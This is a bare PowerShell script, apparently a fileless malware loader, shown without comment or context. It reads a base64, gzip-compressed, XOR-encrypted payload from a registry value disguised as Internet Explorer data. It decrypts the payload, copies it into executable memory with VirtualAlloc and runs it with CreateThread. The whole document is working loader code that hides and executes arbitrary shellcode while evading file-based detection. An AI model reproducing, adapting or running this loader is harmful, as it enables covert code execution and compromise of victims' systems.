$Signature = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

$WinObj = Add-Type -memberDefinition $Signature -Name "Win32" -namespace Win32Functions -passthru

$key = [System.Text.Encoding]::UTF8.GetBytes("xyz")

$Payload = (Get-ItemProperty -Path HKCU:\Software\InternetExplorer\AppDataLow\Software\Microsoft\InternetExplorer).'{018247B2CAC14652E}'

$bytes = [System.Convert]::FromBase64String($Payload)

$input = New-Object System.IO.MemoryStream( , $bytes )
$output = New-Object System.IO.MemoryStream

$sr = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
$sr.CopyTo($output)
$sr.Close()
$input.Close()
[byte[]] $byteOutArray = $output.ToArray()

[byte[]]$decrypted = @()

for ($i = 0; $i -lt $byteOutArray.Length; $i++) {
    $decrypted += $byteOutArray[$i] -bxor $key[$i % $key.Length]
}

$WinMem = $WinObj::VirtualAlloc(0,[Math]::Max($decrypted.Length,0x1000),0x3000,0x40)

[System.Runtime.InteropServices.Marshal]::Copy($decrypted,0,$WinMem,$decrypted.Length)

$WinObj::CreateThread(0,0,$WinMem,0,0,0)